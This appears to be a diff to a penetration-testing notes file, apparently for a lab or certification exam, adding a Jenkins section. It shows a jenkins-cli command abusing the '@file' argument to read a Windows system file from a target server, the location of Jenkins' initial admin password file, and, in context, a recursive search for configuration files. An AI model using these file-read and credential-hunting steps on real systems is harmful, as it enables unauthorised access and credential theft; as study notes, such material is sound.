@@ -64,7 +64,15 @@ Get-ChildItem -Path C:\ -Include *.ps1,*.xml,*.txt,*.config,*.ini -Recurse -Erro
 ## JENKINS
 
 ```powershell
+┌──(koshi㉿kali)-[~/Exam/AD/SRV]
+└─$ java -jar jenkins-cli.jar -s http://172.16.104.202:8080/ -http help "@C:\Windows\win.ini"
 
+ERROR: You must authenticate to access this Jenkins.
+Jenkins CLI
+```
+
+```powershell
+C:\Windows\System32\config\systemprofile\AppData\Local\Jenkins\.jenkins\secrets\initialAdminPassword
 ```
 
 ## 共有の列挙
